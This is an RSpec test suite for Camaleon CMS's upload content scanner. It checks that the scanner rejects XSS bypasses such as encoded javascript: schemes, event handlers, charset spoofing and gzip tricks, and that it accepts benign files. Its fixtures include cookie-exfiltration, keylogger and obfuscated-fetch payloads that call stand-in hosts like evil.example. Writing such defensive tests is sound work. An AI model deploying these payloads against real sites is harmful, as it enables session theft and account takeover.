# frozen_string_literal: true

require 'rails_helper'

RSpec.describe CamaleonCms::UploaderContentSecurity do
  # Minimal host for the concern: file_content_unsafe? only needs the module.
  let(:scanner) { Class.new { include CamaleonCms::UploaderContentSecurity }.new }

  # Builds a real Tempfile so the IO entry point is exercised end to end, the way
  # upload_file calls it.
  def scan(content, ext: '.html')
    Tempfile.create(['scan', ext], binmode: true) do |f|
      f.write(content)
      f.rewind
      scanner.file_content_unsafe?(f)
    end
  end

  describe 'confirmed denylist bypasses' do
    # Each of these was verified to slip past SUSPICIOUS_PATTERNS before this change.
    # See openspec/changes/fix-media-tmp-file-residual/design.md, Decision 4.

    context 'with encoded payloads' do
      it 'rejects a hex-entity encoded javascript scheme' do
        expect(scan(%(<a href="jav&#x61;script:alert(1)">x</a>))).to be_truthy
      end

      it 'rejects a decimal-entity encoded javascript scheme' do
        expect(scan(%(<a href="&#106;avascript:alert(1)">x</a>))).to be_truthy
      end

      it 'rejects a double-encoded javascript scheme' do
        expect(scan(%(<a href="jav&amp;#x61;script:alert(1)">x</a>))).to be_truthy
      end

      it 'rejects a TAB injected inside the scheme' do
        expect(scan(%(<a href="jav\tascript:alert(1)">x</a>))).to be_truthy
      end

      it 'rejects a newline injected inside the scheme' do
        expect(scan(%(<a href="java\nscript:alert(1)">x</a>))).to be_truthy
      end

      it 'rejects a NUL byte injected inside the scheme' do
        expect(scan(%(<a href="java\0script:alert(1)">x</a>))).to be_truthy
      end
    end

    context 'with alternative tag delimiters' do
      it 'rejects a slash-delimited script tag' do
        expect(scan(%(<script/src="//evil.tld"></script>))).to be_truthy
      end
    end

    context 'with unblocked schemes' do
      it 'rejects a vbscript: URI' do
        expect(scan(%(<a href="vbscript:msgbox(1)">x</a>))).to be_truthy
      end

      it 'rejects a dangerous data:text/html URI' do
        expect(scan(%(<a href="data:text/html,alert(1)">x</a>))).to be_truthy
      end

      it 'rejects a data:image/svg+xml URI, which can carry script' do
        expect(scan(%(<a href="data:image/svg+xml,payload">x</a>))).to be_truthy
      end
    end

    context 'with event handlers lost to a typo in the original list' do
      # UNSAFE_EVENT_PATTERNS listed "onunloadonsubmit" as a single token, so neither
      # handler was ever matched. Split into two entries.
      it 'rejects onsubmit' do
        expect(scan(%(<form onsubmit="alert(1)">))).to be_truthy
      end

      it 'rejects onunload' do
        expect(scan(%(<body onunload="alert(1)">))).to be_truthy
      end
    end

    context 'with representative event handlers (single-alternation equivalence)' do
      # The 58 per-stem regexes were folded into one alternation; these span the list and its
      # `<stem>\w*\s*=` family matching, proving the consolidation kept the same coverage.
      %w[onclick onerror onload onmouseover onmousedown onfocusin onreadystatechange onwheel].each do |handler|
        it "rejects #{handler}" do
          expect(scan(%(<div #{handler}="alert(1)">x</div>))).to be_truthy
        end
      end

      it 'still tolerates whitespace between the handler and the equals sign' do
        expect(scan(%(<div onclick = "alert(1)">x</div>))).to be_truthy
      end

      it 'does not flag a plain word that merely starts with "on"' do
        expect(scan('The online onboarding notes are onerous.', ext: '.txt')).to be_falsey
      end
    end

    context 'with dangerous elements' do
      it 'rejects a meta refresh redirect' do
        expect(scan(%(<meta http-equiv="refresh" content="0;url=//evil.tld">))).to be_truthy
      end

      it 'rejects a style element with a remote import' do
        expect(scan(%(<style>@import "//evil.tld/x.css";</style>))).to be_truthy
      end

      it 'rejects a form with a remote action' do
        expect(scan(%(<form action="//evil.tld"><input name=p></form>))).to be_truthy
      end

      it 'rejects an applet element' do
        expect(scan(%(<applet code="Evil.class"></applet>))).to be_truthy
      end

      it 'rejects frameset and frame elements' do
        expect(scan(%(<frameset><frame src="//evil.tld"></frameset>))).to be_truthy
      end
    end
  end

  describe 'content that must keep passing' do
    it 'accepts plain text' do
      expect(scan('Just a normal readme about uploads.', ext: '.txt')).to be_falsey
    end

    it 'accepts an embedded raster image encoded as a data:image/* URI' do
      expect(scan(%(<img src="data:image/png;base64,iVBORw0KGgo=">), ext: '.html')).to be_falsey
    end

    it 'accepts prose that merely contains a scheme-like word' do
      expect(scan('See the metadata: 42 rows of data below.', ext: '.txt')).to be_falsey
    end

    it 'accepts CSV' do
      expect(scan("name,email\nAda,ada@example.com", ext: '.csv')).to be_falsey
    end

    it 'accepts JSON' do
      expect(scan(%({"title":"Report","count":42}), ext: '.json')).to be_falsey
    end
  end

  describe 'ruleset selection by render behavior' do
    # Well-formed XML and valid HTML at once, so the only variable across these examples is which
    # ruleset the extension selects. `onpointerdown` is matched by the parse-based checker's shape
    # rule and by no stem in ContentSecurity::UNSAFE_EVENT_HANDLERS.
    let(:handler_payload) do
      %(<svg xmlns="http://www.w3.org/2000/svg"><rect onpointerdown="alert(1)" width="10" height="10"/></svg>)
    end

    %w[.svg .svgz .html .htm .xhtml .xht .shtml .xml .xsl .xslt].each do |extension|
      it "refuses the payload under #{extension}" do
        expect(scanner).to be_content_unsafe(handler_payload, filename: "x#{extension}")
      end
    end

    it 'refuses it under a compound .svg.gz name, which File.extname reports as .gz' do
      expect(scanner).to be_content_unsafe(handler_payload, filename: 'x.svg.gz')
    end

    it 'refuses it under an uppercase markup extension' do
      expect(scanner).to be_content_unsafe(handler_payload, filename: 'x.HTML')
    end

    it 'refuses it under a bare markup dotfile name' do
      expect(scanner).to be_content_unsafe(handler_payload, filename: '.html')
    end

    # A trailing dot makes File.extname report no extension, but a server that strips it serves the
    # bytes as SVG -- so routing must read the extension off the stripped name.
    it 'refuses it under a trailing-dot markup name' do
      expect(scanner).to be_content_unsafe(handler_payload, filename: 'x.svg.')
    end

    it 'refuses it under a trailing-space markup name' do
      expect(scanner).to be_content_unsafe(handler_payload, filename: 'x.svg ')
    end

    # The reason routing must stay narrow. An HTML parse of this text invents a `b` element with an
    # `on` attribute, so a wider markup list would refuse ordinary text files.
    it 'accepts a text file whose prose parses to a spurious on attribute' do
      expect(scanner).not_to be_content_unsafe('if a<b and on=1 then x', filename: 'notes.txt')
    end

    it 'keeps the generic ruleset for a non-markup extension' do
      expect(CamaleonCms::SvgContentChecker).not_to receive(:unsafe?)
      scanner.content_unsafe?('harmless', filename: 'x.pdf')
    end
  end

  describe 'executable script' do
    # The refusal is by extension, not by inspecting the script, because inspecting it cannot work:
    # every one of these payloads is ordinary JavaScript doing ordinary JavaScript things, and a
    # legitimate uploaded library is indistinguishable from them by any static rule.
    {
      'cookie exfiltration' => %(fetch('https://evil.example/c?'+document.cookie)),
      'a keylogger' => %(document.addEventListener('keydown',e=>navigator.sendBeacon('//e.example',e.key))),
      'an obfuscated fetch' => %(window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])),
      'the Function constructor' => %([]['constructor']['constructor']('return 1')())
    }.each do |label, payload|
      it "refuses #{label}" do
        expect(scanner).to be_content_unsafe(payload, filename: 'x.js')
      end
    end

    %w[js mjs cjs wasm swf].each do |extension|
      it "refuses a .#{extension} upload" do
        expect(scanner).to be_content_unsafe('console.log(1)', filename: "lib.#{extension}")
      end
    end

    it 'refuses an uppercase script extension' do
      expect(scanner).to be_content_unsafe('console.log(1)', filename: 'lib.JS')
    end

    it 'refuses a bare script dotfile name' do
      expect(scanner).to be_content_unsafe('console.log(1)', filename: '.js')
    end

    it 'refuses an empty script file, since the content is never consulted' do
      expect(scanner).to be_content_unsafe('', filename: 'lib.js')
    end

    it 'does not refuse a filename that merely contains js' do
      expect(scanner).not_to be_content_unsafe('plain notes', filename: 'notes-js.txt')
    end
  end

  describe 'compressed markup' do
    def gzip(payload)
      buffer = StringIO.new(+'', 'wb')
      writer = Zlib::GzipWriter.new(buffer)
      writer.write(payload)
      writer.close
      buffer.string
    end

    let(:hostile_svg) do
      %(<svg xmlns="http://www.w3.org/2000/svg"><rect onpointerdown="alert(1)" width="10" height="10"/></svg>)
    end

    let(:clean_svg) do
      %(<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>)
    end

    %w[x.svgz x.svg.gz].each do |name|
      it "refuses a hostile payload gzipped under #{name}" do
        expect(scanner).to be_content_unsafe(gzip(hostile_svg), filename: name)
      end

      it "accepts a clean payload gzipped under #{name}" do
        expect(scanner).not_to be_content_unsafe(gzip(clean_svg), filename: name)
      end
    end

    it 'refuses a payload that decompresses past the ceiling' do
      bomb = gzip('a' * (CamaleonCms::UploaderContentSecurity::MAX_DECOMPRESSED_MARKUP_BYTES + 1024))

      expect(scanner).to be_content_unsafe(bomb, filename: 'bomb.svgz')
    end

    it 'stops at the bound rather than materializing the whole expansion' do
      bomb = gzip('a' * (CamaleonCms::UploaderContentSecurity::MAX_DECOMPRESSED_MARKUP_BYTES + 1024))
      ceiling = CamaleonCms::UploaderContentSecurity::MAX_DECOMPRESSED_MARKUP_BYTES

      # Pins the lazy read: a reader that decompressed to EOF and measured afterwards would ask for
      # everything, which is exactly what a bomb is built to exploit.
      expect_any_instance_of(Zlib::GzipReader).to receive(:read).with(ceiling + 1).and_call_original
      scanner.content_unsafe?(bomb, filename: 'bomb.svgz')
    end

    it 'still scans ungzipped bytes stored under a compressed extension' do
      expect(scanner).to be_content_unsafe(hostile_svg, filename: 'x.svgz')
    end

    it 'accepts clean ungzipped bytes stored under a compressed extension' do
      expect(scanner).not_to be_content_unsafe(clean_svg, filename: 'x.svgz')
    end

    # `gzip(a) + gzip(b)` is a two-member stream. GzipReader#read stops at member 1, but a compliant
    # decoder concatenates both, so a hostile payload split across the boundary must still be caught.
    it 'refuses a multi-member gzip whose payload spans the member boundary' do
      bytes = gzip('<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/>') +
              gzip('<rect onpointerdown="alert(1)"/></svg>')

      expect(scanner).to be_content_unsafe(bytes, filename: 'x.svgz')
    end

    it 'accepts a clean multi-member gzip, decompressing every member rather than rejecting on sight' do
      bytes = gzip('<svg xmlns="http://www.w3.org/2000/svg">') +
              gzip('<rect width="10" height="10"/></svg>')

      expect(scanner).not_to be_content_unsafe(bytes, filename: 'x.svgz')
    end
  end

  describe 'escaped code examples' do
    # Normalization decodes entities before matching, so the generic ruleset rejects a document that
    # merely *shows* escaped markup. Fail-closed and intentional; pinned for the extensions that
    # still use it.
    it 'rejects escaped code examples in a non-markup file, where the generic ruleset decides' do
      expect(scan(%(Use &lt;script&gt; carefully), ext: '.txt')).to be_truthy
    end

    # For markup the parse decides, and the parse is right: `&lt;script&gt;` is text, not an
    # element, and a browser renders it as literal characters. The false positive is gone for the
    # formats where a parser can tell the difference -- the point of routing markup to a parser.
    it 'accepts escaped code examples in a markup file, where the parse decides' do
      expect(scan(%(<p>Use &lt;script&gt; carefully</p>))).to be_falsey
    end

    it 'still rejects a real script element in the same markup file' do
      expect(scan(%(<p>hi</p><script>alert(1)</script>))).to be_truthy
    end
  end

  describe 'encoding-confusion backstop' do
    # A markup parser autodetects its encoding from in-band signals; a browser can resolve them
    # differently. A pure-ASCII document that declares utf-16 fires its handlers in the browser
    # (WHATWG maps a utf-16 <meta charset> back to UTF-8), while the HTML parser re-decodes the
    # bytes as utf-16 and sees no handlers. The byte-level backstop refuses it regardless.
    it 'rejects a spoofed <meta charset> that hides a handler from the parser' do
      expect(scan(%(<!doctype html><meta charset="utf-16"><img src=x onerror="alert(1)">))).to be_truthy
    end

    it 'rejects a spoofed <meta charset> that hides a <script> from the parser' do
      expect(scan(%(<!doctype html><meta charset="utf-32"><script>alert(1)</script>))).to be_truthy
    end

    it 'rejects real UTF-16 markup bytes carrying a handler' do
      utf16 = %(<img src=x onerror="alert(1)">).encode(Encoding::UTF_16LE).b
      expect(scanner).to be_content_unsafe(utf16, filename: 'x.html')
    end

    # The backstop must not entity-decode, or it would reintroduce the escaped-markup false positive
    # the parse-based checker exists to remove.
    it 'still accepts a markup file that merely displays escaped markup' do
      expect(scan(%(<p>Use &lt;script&gt; carefully</p>))).to be_falsey
    end
  end

  describe 'IO handling' do
    it 'rewinds the IO after a passing scan so the content can be read again' do
      Tempfile.create(['scan', '.txt'], binmode: true) do |f|
        f.write('harmless content')
        f.rewind
        scanner.file_content_unsafe?(f)
        expect(f.read).to eq('harmless content')
      end
    end
  end

  describe '#content_unsafe?' do
    it 'returns the same verdict as the IO entry point for unsafe content' do
      content = %(<a href="jav&#x61;script:alert(1)">x</a>)
      expect(scanner).to be_content_unsafe(content, filename: 'x.html')
      expect(scan(content)).to be_truthy
    end

    it 'returns the same verdict as the IO entry point for safe content' do
      content = 'nothing to see here'
      expect(scanner).not_to be_content_unsafe(content, filename: 'x.txt')
      expect(scan(content, ext: '.txt')).to be_falsey
    end

    it 'routes SVG content to the parse-based checker' do
      # A bare foreignObject is caught only by the parse-based checker (the byte-level backstop does
      # not list it), so reaching a verdict of unsafe proves the content was routed to the parse.
      svg = %(<svg xmlns="http://www.w3.org/2000/svg"><foreignObject/></svg>)
      expect(CamaleonCms::SvgContentChecker).to receive(:unsafe?).with(svg, mode: :xml).and_call_original
      expect(scanner.content_unsafe?(svg, filename: 'x.svg')).to be(true)
    end

    it 'accepts a clean SVG' do
      svg = %(<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>)
      expect(scanner.content_unsafe?(svg, filename: 'x.svg')).to be_nil
    end

    # A bare <foreignObject> is a banned SVG tag (SvgContentChecker::BANNED_TAGS) that the generic
    # element denylist (ContentSecurity::BLOCKED_ELEMENTS) does not list, so it is rejected only
    # when the upload is routed through the SVG-specific scanner. A case-sensitive `.svg` check
    # sent `evil.SVG` down the weaker generic path where the payload passed.
    context 'with an uppercase .SVG extension' do
      let(:svg_only_payload) { %(<svg xmlns="http://www.w3.org/2000/svg"><foreignObject/></svg>) }

      it 'is caught by the SVG scanner for a lowercase .svg' do
        expect(scanner.content_unsafe?(svg_only_payload, filename: 'x.svg')).to be(true)
      end

      it 'is caught by the SVG scanner for an uppercase .SVG too' do
        expect(scanner.content_unsafe?(svg_only_payload, filename: 'x.SVG')).to be(true)
      end

      it 'accepts a clean uppercase .SVG (routed through the SVG checker, not the generic scan)' do
        clean = %(<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>)
        expect(CamaleonCms::SvgContentChecker).to receive(:unsafe?).with(clean, mode: :xml).and_call_original
        expect(scanner.content_unsafe?(clean, filename: 'x.SVG')).to be_nil
      end
    end

    # File.extname reports no extension for a dotfile, so an extname-based test alone would
    # route a file named exactly `.svg` to the generic scanner — weaker than the SVG parser
    # the pre-hardening `end_with?` check sent it to. Routing must stay fail-closed.
    context 'with a filename that is exactly ".svg" (dotfile)' do
      let(:svg_only_payload) { %(<svg xmlns="http://www.w3.org/2000/svg"><foreignObject/></svg>) }

      it 'still routes the name to the SVG scanner' do
        expect(scanner.content_unsafe?(svg_only_payload, filename: '.svg')).to be(true)
      end

      it 'routes an uppercase ".SVG" dotfile the same way' do
        expect(scanner.content_unsafe?(svg_only_payload, filename: '.SVG')).to be(true)
      end

      it 'routes a path whose basename is ".svg" the same way' do
        expect(scanner.content_unsafe?(svg_only_payload, filename: 'tmp/.svg')).to be(true)
      end
    end

    it 'handles binary content without raising' do
      binary = File.binread("#{CAMALEON_CMS_ROOT}/spec/support/fixtures/rails.png")
      expect { scanner.content_unsafe?(binary, filename: 'rails.png') }.not_to raise_error
    end
  end

  describe CamaleonCms::ContentSecurity do
    describe '.blocked_scheme?' do
      it 'flags a plain javascript: scheme' do
        expect(described_class.blocked_scheme?('javascript:alert(1)')).to be(true)
      end

      it 'flags an entity/control-char obfuscated scheme after normalization' do
        expect(described_class.blocked_scheme?('jav&#x61;script:alert(1)')).to be(true)
        expect(described_class.blocked_scheme?("java\tscript:alert(1)")).to be(true)
      end

      it 'does not flag safe text' do
        expect(described_class.blocked_scheme?('just a normal caption')).to be(false)
      end

      it 'returns false for nil' do
        expect(described_class.blocked_scheme?(nil)).to be(false)
      end
    end

    describe '.suspicious_markup_bytes?' do
      it 'matches a handler hidden behind NUL padding (UTF-16-style bytes)' do
        expect(described_class.suspicious_markup_bytes?("o\x00n\x00e\x00r\x00r\x00o\x00r\x00=\x00")).to be(true)
      end

      it 'matches a blocked element hidden behind NUL padding' do
        expect(described_class.suspicious_markup_bytes?("<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00")).to be(true)
      end

      it 'does not entity-decode, so escaped markup is not flagged' do
        expect(described_class.suspicious_markup_bytes?('Use &lt;script&gt; carefully')).to be(false)
      end

      it 'returns false for nil' do
        expect(described_class.suspicious_markup_bytes?(nil)).to be(false)
      end
    end

    describe '.normalize' do
      it 'decodes entities so encoded payloads match' do
        expect(described_class.normalize('jav&#x61;script:')).to include('javascript:')
      end

      it 'stops after DECODE_PASSES rather than looping until stable' do
        # Nested escaping: each pass peels exactly one "amp;" layer. Five layers plus
        # the cap of 5 leaves the innermost "&#x61;" undecoded, proving the bound.
        #
        # Not a bypass: browsers decode entities once, so a multiply-encoded payload
        # renders as literal text rather than as a live scheme. The cap exists to stop
        # a decoding bomb, matching UserUrlValidator#validate_path_traversal.
        deep = "&#{'amp;' * 5}#x61;"
        expect(described_class::DECODE_PASSES).to eq(5)
        expect(described_class.normalize(deep)).to eq('&#x61;')
      end

      it 'strips NUL and C0 controls' do
        expect(described_class.normalize("java\0script:")).to include('javascript:')
      end

      it 'preserves C1 bytes so multibyte text is not mangled' do
        utf8 = 'héllo wörld'
        expect(described_class.normalize(utf8).force_encoding('UTF-8')).to eq(utf8)
      end

      it 'returns nil unchanged' do
        expect(described_class.normalize(nil)).to be_nil
      end
    end
  end
end
